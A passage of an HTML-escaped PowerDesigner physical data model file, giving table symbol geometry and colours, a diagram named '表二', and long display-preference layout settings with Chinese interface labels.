Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o21&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o11&quot;&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((6739,-4067), (13083,3251))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o22&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o14&quot;&gt;&lt;a:ModificationDate&gt;1618333904&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((14647,11746), (20991,16184))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o23&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o7&quot;&gt;&lt;a:ModificationDate&gt;1618333929&lt;/a:ModificationDate&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((5883,-23212), (12227,-15894))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o24&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;o:TableSymbol Id=&quot;o17&quot;&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-13938,11506), (-8582,16904))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:FillColor&gt;1422826&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 新宋体,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 Arial,8,N&lt;/a:FontList&gt;&lt;a:BrushStyle&gt;6&lt;/a:BrushStyle&gt;&lt;a:GradientFillMode&gt;65&lt;/a:GradientFillMode&gt;&lt;a:GradientEndColor&gt;16777215&lt;/a:GradientEndColor&gt;&lt;c:Object&gt;&lt;o:Table Ref=&quot;o25&quot;/&gt;&lt;/c:Object&gt;&lt;/o:TableSymbol&gt;&lt;/c:Symbols&gt;&lt;/o:PhysicalDiagram&gt;&lt;o:PhysicalDiagram Id=&quot;o26&quot;&gt;&lt;a:ObjectID&gt;7C4F6179-5D24-4ADA-9955-04EE31B3D82A&lt;/a:ObjectID&gt;&lt;a:Name&gt;表二&lt;/a:Name&gt;&lt;a:Code&gt;表二&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;74E6538B-016D-4AA9-9C57-D0BAD0C88CCA&#125;DAT 1618333034&lt;/a:History&gt;&lt;a:DisplayPreferences&gt;[DisplayPreferences][DisplayPreferences\\PDM][DisplayPreferences\\General]Adjust to text=YesSnap Grid=NoConstrain Labels=YesDisplay Grid=NoShow Page Delimiter=NoShow Links intersections=YesActivate automatic link routing=YesGrid size=800Graphic unit=2Window color=255 255 255Background image=Background mode=8Watermark image=Watermark mode=8Show watermark on screen=NoGradient mode=0Gradient end color=255 255 255Show Swimlane=NoSwimlaneVert=YesTreeVert=NoCompDark=0[DisplayPreferences\\Object]Show Icon=NoMode=0Trunc Length=80Word Length=80Word Text=!&amp;quot;&amp;quot;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\]^_`&#123;|&#125;~Shortcut IntIcon=YesShortcut IntLoct=YesShortcut IntFullPath=NoShortcut IntLastPackage=YesShortcut ExtIcon=YesShortcut ExtLoct=NoShortcut ExtFullPath=NoShortcut ExtLastPackage=YesShortcut ExtIncludeModl=YesEObjShowStrn=YesExtendedObject.Comment=NoExtendedObject.IconPicture=NoExtendedObject.TextStyle=NoExtendedObject_SymbolLayout=ELnkShowStrn=YesELnkShowName=YesExtendedLink_SymbolLayout=ExtDpdShowStrn=YesExtendedDependency_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Stereotype&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;FileObject.Stereotype=NoFileObject.DisplayName=YesFileObject.LocationOrName=NoFileObject.IconPicture=NoFileObject.TextStyle=NoFileObject.IconMode=YesFileObject_SymbolLayout=Package.Stereotype=YesPackage.Comment=NoPackage.IconPicture=NoPackage.TextStyle=NoPackage_SymbolLayout=Display Model Version=YesTable.Stereotype=YesTable.DisplayName=YesTable.OwnerDisplayName=NoTable.Columns=YesTable.Columns._Filter=所有列 PDMCOLNALLTable.Columns._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorTable.Columns._Limit=-5Table.Keys=NoTable.Keys._Columns=Stereotype IndicatorTable.Indexes=NoTable.Indexes._Columns=StereotypeTable.Triggers=NoTable.Triggers._Columns=StereotypeTable.Comment=NoTable.IconPicture=NoTable.TextStyle=NoTable_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Columns&amp;quot; Collection=&amp;quot;Columns&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nDataType No\\r\\nSymbolDataType No 域或数据类型\\r\\nDomain No\\r\\nKeyIndicator No\\r\\nIndexIndicator No\\r\\nNullStatus No&amp;quot; Filters=&amp;quot;所有列 PDMCOLNALL &amp;amp;quot;&amp;amp;quot;\\r\\n主键列 PDMCOLNPK &amp;amp;quot;\\&amp;amp;quot;PRIM \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n键列 PDMCOLNKEY &amp;amp;quot;\\&amp;amp;quot;KEYS \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Keys&amp;quot; Collection=&amp;quot;Keys&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIndicator No&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Indexes&amp;quot; Collection=&amp;quot;Indexes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIndicator No&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Triggers&amp;quot; Collection=&amp;quot;Triggers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;View.Stereotype=YesView.DisplayName=YesView.OwnerDisplayName=NoView.Columns=YesView.Columns._Columns=DisplayNameView.Columns._Limit=-5View.TemporaryVTables=YesView.Indexes=NoView.Comment=NoView.IconPicture=NoView.TextStyle=NoView_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Columns&amp;quot; Collection=&amp;quot;Columns&amp;quot; Columns=&amp;quot;DisplayName No\\r\\nExpression No\\r\\nDataType No\\r\\nSymbolDataType No 域或数据类型\\r\\nIndexIndicator No&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Tables&amp;quot; Collection=&amp;quot;TemporaryVTables&amp;quot; Columns=&amp;quot;Name Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Indexes&amp;quot; Collection=&amp;quot;Indexes&amp;quot; Columns=&amp;quot;DisplayName Yes&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Procedure.Stereotype=NoProcedure.DisplayName=YesProcedure.OwnerDisplayName=NoProcedure.Comment=NoProcedure.IconPicture=NoProcedure.TextStyle=NoProcedure_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Owner and Name&amp;quot; Attribute=&amp;quot;OwnerDisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Reference.Cardinality=NoReference.ImplementationType=NoReference.ChildRole=YesReference.Stereotype=YesReference.DisplayName=YesReference.ForeignKeyConstraintName=YesReference.JoinExpression=NoReference.Integrity=NoReference.ParentRole=YesReference_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Cardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Implementation&amp;quot; Attribute=&amp;quot;ImplementationType&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Child Role&amp;quot; Attribute=&amp;quot;ChildRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;约束名称(&amp;amp;amp;T)&amp;quot; Attribute=&amp;quot;ForeignKeyConstraintName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;约束名称(&amp;amp;amp;T)&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;连接&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;连接&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;参照完整性&amp;quot; Attribute=&amp;quot;Integrity&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;参照完整性&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Parent Role&amp;quot; Attribute=&amp;quot;ParentRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;ViewReference.ChildRole=YesViewReference.Stereotype=YesViewReference.DisplayName=NoViewReference.JoinExpression=NoViewReference.ParentRole=YesViewReference_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Child Role&amp;quot; Attribute=&amp;quot;ChildRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;ExclusiveChoice Name=&amp;quot;Exclusive Choice&amp;quot; Mandatory=&amp;quot;No&amp;quot; Display=&amp;quot;HorizontalRadios&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Join Expression&amp;quot; Attribute=&amp;quot;JoinExpression&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/ExclusiveChoice&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Parent Role&amp;quot; Attribute=&amp;quot;ParentRole&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Entity.Stereotype=YesEntity.Attributes=YesEntity.Attributes._Filter=所有属性 LDMPENTALLEntity.Attributes._Columns=Stereotype DomainOrDataType IdentifierIndicator NullIndicatorEntity.Attributes._Limit=-5Entity.Identifiers=YesEntity.Identifiers._Columns=Stereotype IdentifierIndicatorEntity.Comment=NoEntity.IconPicture=NoEntity.TextStyle=NoEntity_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; Filters=&amp;quot;所有属性 LDMPENTALL &amp;amp;quot;&amp;amp;quot;\\r\\n主属性 LDMPENTPK &amp;amp;quot;\\&amp;amp;quot;PIDTF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;\\r\\n识别属性 LDMPENTIDTF &amp;amp;quot;\\&amp;amp;quot;AIDF \\&amp;amp;quot;TRUE\\&amp;amp;quot; TRUE\\&amp;amp;quot;&amp;amp;quot;&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Identifiers&amp;quot; Collection=&amp;quot;Identifiers&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nIdentifierIndicator No 标识符指标&amp;quot; HasLimit=&amp;quot;No&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; 